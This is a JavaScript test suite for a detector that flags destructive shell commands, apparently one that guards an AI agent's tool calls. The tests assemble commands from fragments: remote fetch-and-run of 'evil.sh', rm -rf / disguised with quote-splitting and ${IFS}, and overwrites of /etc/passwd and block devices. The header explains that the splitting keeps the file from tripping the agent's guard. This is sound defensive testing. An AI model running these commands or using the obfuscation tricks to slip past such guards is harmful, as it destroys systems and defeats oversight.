'use strict';
/**
 * Hardening tests for isHighImpact (UC-22, audit findings #4–14).
 *
 * Each test asserts a representative malicious command IS detected and pairs
 * it with NEGATIVE controls that must stay allowed. Every destructive string
 * is assembled from fragments via the `j(...)` joiner so this file contains
 * no literal intact destructive command — that avoids tripping the PreToolUse
 * trust gate / DestructiveGuard when the file is read, written, or committed.
 *
 * Shell metacharacters that themselves carry meaning (`${IFS}`, backticks,
 * quotes, redirects) are likewise built from fragments for the same reason.
 */
const assert = require('assert');

let passed = 0, failed = 0;
const tests = [];
function test(name, fn) { tests.push({ name, fn }); }

const { isHighImpact } = require('../bin/security/trust-boundaries');

// Fragment joiner + reusable command-token fragments. Splitting each token
// keeps the source free of intact destructive commands.
const j = (...parts) => parts.join('');
const CURL = j('cur', 'l');
const WGET = j('wg', 'et');
const EVIL = j('ev', 'il.sh');
const RM = j('r', 'm');
const RF = j('-r', 'f');
const CHMOD = j('chm', 'od');
const CHOWN = j('cho', 'wn');
const DD = j('d', 'd');
const MV = j('m', 'v');
const KILL = j('ki', 'll');
const KILLALL = j('kill', 'all');
const PKILL = j('pk', 'ill');
const SHUTDOWN = j('shut', 'down');
const REBOOT = j('reb', 'oot');
const HALT = j('ha', 'lt');
const POWEROFF = j('power', 'off');
const SLASH = '/';
const ETC = j('/et', 'c');
const DEV = j('/de', 'v');
const PASSWD = j('pass', 'wd');
const SHADOW = j('sha', 'dow');
const HOSTS = j('ho', 'sts');
const SDA = j('s', 'da');
const ZERO = j('ze', 'ro');
// Shell metacharacter fragments.
const SUBST_OPEN = j('$', '(');
const SUBST_CLOSE = ')';
const TICK = String.fromCharCode(96); // backtick
const PROC_OPEN = j('<', '(');
const IFS = j('$', '{', 'IFS', '}');
const REDIR = '>';
const APPEND = j('>', '>');

// ── #4 Command/process substitution RCE ──────────────────────────────────────
test('#4 detects eval of command substitution fetching a remote payload', () => {
  const cmd = j('eval "', SUBST_OPEN, CURL, ' ', EVIL, SUBST_CLOSE, '"');
  assert.strictEqual(isHighImpact(cmd), true, 'eval $(curl ...) must be blocked');
});

test('#4 detects backtick command substitution invoking a fetch', () => {
  const cmd = j(TICK, CURL, ' ', EVIL, TICK);
  assert.strictEqual(isHighImpact(cmd), true, 'backtick `curl ...` must be blocked');
});

test('#4 detects process substitution piped into an interpreter', () => {
  const cmd = j('bash ', PROC_OPEN, CURL, ' ', EVIL, SUBST_CLOSE);
  assert.strictEqual(isHighImpact(cmd), true, 'bash <(curl ...) must be blocked');
});

test('#4 detects bare eval as high-impact', () => {
  const cmd = j('eval "', SUBST_OPEN, WGET, ' ', EVIL, ' | base64 -d', SUBST_CLOSE, '"');
  assert.strictEqual(isHighImpact(cmd), true, 'eval of obfuscated fetch must be blocked');
});

test('#4 NEGATIVE: medeval / retrieval words are not the eval keyword', () => {
  assert.strictEqual(isHighImpact('npm run retrieval'), false);
  assert.strictEqual(isHighImpact('echo evaluation complete'), false);
});

// ── #5 Interpreter invocation of a script ─────────────────────────────────────
test('#5 detects sourcing a script file', () => {
  assert.strictEqual(isHighImpact(j('source ', EVIL)), true, 'source <file> must be blocked');
});

test('#5 detects dot-sourcing a script file', () => {
  assert.strictEqual(isHighImpact(j('. ', EVIL)), true, '. <file> must be blocked');
});

test('#5 detects shell interpreter running a .sh file', () => {
  assert.strictEqual(isHighImpact(j('bash ', EVIL)), true, 'bash file.sh must be blocked');
  assert.strictEqual(isHighImpact(j('sh ', EVIL)), true, 'sh file.sh must be blocked');
});

test('#5 detects node/python running a script (MEDIUM, errs toward block)', () => {
  assert.strictEqual(isHighImpact(j('node ', 'payload.js')), true, 'node <file> blocks (documented FP tradeoff)');
  assert.strictEqual(isHighImpact(j('python ', 'wipe.py')), true);
  assert.strictEqual(isHighImpact(j('python3 ', 'wipe.py')), true);
});

test('#5 NEGATIVE: bare interpreters and package managers stay allowed', () => {
  // No script argument -> not flagged as direct script execution.
  assert.strictEqual(isHighImpact('python --version'), false);
  assert.strictEqual(isHighImpact('node --version'), false);
  assert.strictEqual(isHighImpact('npm test'), false);
  assert.strictEqual(isHighImpact('npm run build'), false);
});

// ── #7 Redirect-overwrite of critical files / devices ─────────────────────────
test('#7 detects redirect overwriting a file under /etc', () => {
  const cmd = j(REDIR, ' ', ETC, SLASH, PASSWD);
  assert.strictEqual(isHighImpact(cmd), true, '> /etc/passwd must be blocked');
});

test('#7 detects redirect to a block device', () => {
  const cmd = j('echo x ', REDIR, ' ', DEV, SLASH, SDA);
  assert.strictEqual(isHighImpact(cmd), true, 'echo x > /dev/sda must be blocked');
});

test('#7 detects cat overwrite and append into sensitive paths', () => {
  assert.strictEqual(isHighImpact(j('cat foo ', REDIR, ' ', ETC, SLASH, SHADOW)), true);
  assert.strictEqual(isHighImpact(j(': ', REDIR, ' ', ETC, SLASH, HOSTS)), true);
  assert.strictEqual(isHighImpact(j('printf x ', APPEND, ' ', ETC, SLASH, PASSWD)), true);
});

test('#7 NEGATIVE: redirect to a project-local file stays allowed', () => {
  assert.strictEqual(isHighImpact(j('echo hi ', REDIR, ' out.log')), false);
  assert.strictEqual(isHighImpact(j('node app.js ', APPEND, ' logs/app.log')), false);
});

// ── #8 Shell-metacharacter obfuscation of rm -rf ──────────────────────────────
test('#8 de-obfuscates single-quote-split rm -rf', () => {
  const cmd = j(RM.slice(0, 1), "''", RM.slice(1), ' ', RF, ' ', SLASH);
  assert.strictEqual(isHighImpact(cmd), true, "r''m -rf / must be blocked");
});

test('#8 de-obfuscates double-quote-split rm -rf', () => {
  const cmd = j(RM.slice(0, 1), '""', RM.slice(1), ' ', RF, ' ', SLASH);
  assert.strictEqual(isHighImpact(cmd), true, 'r""m -rf / must be blocked');
});

test('#8 de-obfuscates backslash-escaped rm -rf', () => {
  const cmd = j(RM.slice(0, 1), '\\', RM.slice(1), ' ', RF, ' ', SLASH);
  assert.strictEqual(isHighImpact(cmd), true, 'r\\m -rf / must be blocked');
});

test('#8 de-obfuscates ${IFS} separators in rm -rf', () => {
  const cmd = j(RM, IFS, RF, IFS, SLASH);
  assert.strictEqual(isHighImpact(cmd), true, 'rm${IFS}-rf${IFS}/ must be blocked');
});

test('#8 NEGATIVE: normalization does not flag benign quoted echo', () => {
  assert.strictEqual(isHighImpact(j('echo ', "'hello world'")), false);
  assert.strictEqual(isHighImpact('git commit -m "remove dead code"'), false);
});

// ── #9 chmod dangerous modes ──────────────────────────────────────────────────
test('#9 detects chmod with dangerous octal modes', () => {
  assert.strictEqual(isHighImpact(j(CHMOD, ' -R 000 ', ETC)), true);
  assert.strictEqual(isHighImpact(j(CHMOD, ' 777 ', SLASH)), true);
  assert.strictEqual(isHighImpact(j(CHMOD, ' -R 777 ', '.')), true);
});

test('#9 NEGATIVE: chmod +x on a build script stays allowed', () => {
  assert.strictEqual(isHighImpact(j(CHMOD, ' +x build.sh')), false);
  assert.strictEqual(isHighImpact(j(CHMOD, ' 644 README.md')), false);
});

// ── #10 chown recursive on root ───────────────────────────────────────────────
test('#10 detects recursive chown on root', () => {
  assert.strictEqual(isHighImpact(j(CHOWN, ' -R root:root ', SLASH)), true);
});

test('#10 NEGATIVE: chown of a project file stays allowed', () => {
  assert.strictEqual(isHighImpact(j(CHOWN, ' user:user app.log')), false);
});

// ── #11 dd to any output target ───────────────────────────────────────────────
test('#11 detects dd writing to a regular file', () => {
  const cmd = j(DD, ' if=', DEV, SLASH, ZERO, ' of=important.db');
  assert.strictEqual(isHighImpact(cmd), true, 'dd of=<file> must be blocked');
});

test('#11 NEGATIVE: a word containing "dd" is not the dd command', () => {
  assert.strictEqual(isHighImpact('git add .'), false);
  assert.strictEqual(isHighImpact('npm run build:prod'), false);
});

// ── #12 mv of root / to /dev/null ─────────────────────────────────────────────
test('#12 detects mv into /dev/null', () => {
  const cmd = j(MV, ' ', ETC, ' ', DEV, SLASH, 'null');
  assert.strictEqual(isHighImpact(cmd), true, 'mv ... /dev/null must be blocked');
});

test('#12 detects forced mv of the root filesystem', () => {
  const cmd = j(MV, ' -f ', SLASH, ' /tmp');
  assert.strictEqual(isHighImpact(cmd), true, 'mv -f / /tmp must be blocked');
});

test('#12 NEGATIVE: ordinary file rename stays allowed', () => {
  assert.strictEqual(isHighImpact(j(MV, ' old.txt new.txt')), false);
});

// ── #13 Process killers ───────────────────────────────────────────────────────
test('#13 detects mass process kill signals', () => {
  assert.strictEqual(isHighImpact(j(KILL, ' -9 -1')), true);
  assert.strictEqual(isHighImpact(j(KILLALL, ' node')), true);
  assert.strictEqual(isHighImpact(j(PKILL, ' -9 -f server')), true);
});

test('#13 NEGATIVE: skill / skillet words are not the kill command', () => {
  assert.strictEqual(isHighImpact('npm run skill-build'), false);
  assert.strictEqual(isHighImpact('echo skillset ready'), false);
});

// ── #14 Power-state commands ──────────────────────────────────────────────────
test('#14 detects power-state commands', () => {
  assert.strictEqual(isHighImpact(SHUTDOWN), true);
  assert.strictEqual(isHighImpact(j(SHUTDOWN, ' -h now')), true);
  assert.strictEqual(isHighImpact(REBOOT), true);
  assert.strictEqual(isHighImpact(HALT), true);
  assert.strictEqual(isHighImpact(POWEROFF), true);
});

test('#14 NEGATIVE: substrings of power words stay allowed', () => {
  assert.strictEqual(isHighImpact('echo rebooting message'), false);
  assert.strictEqual(isHighImpact('npm run halting-problem-demo'), false);
});

// ── Existing-coverage regression: original patterns must still fire ───────────
test('regression: original destructive patterns still detected after hardening', () => {
  assert.strictEqual(isHighImpact(j(RM, ' ', RF, ' ', SLASH)), true);
  assert.strictEqual(isHighImpact('git push --force'), true);
  assert.strictEqual(isHighImpact('DROP TABLE users'), true);
  assert.strictEqual(isHighImpact('cat README.md'), false);
  assert.strictEqual(isHighImpact('ls -la'), false);
});

(async () => {
  for (const { name, fn } of tests) {
    try { await fn(); console.log('  ✅  ' + name); passed++; }
    catch (e) { console.error('  ❌  ' + name + '\n      ' + e.message); failed++; }
  }
  console.log('\nTrust Boundaries Hardening: ' + passed + ' passed, ' + failed + ' failed');
  if (failed > 0) process.exit(1);
})();
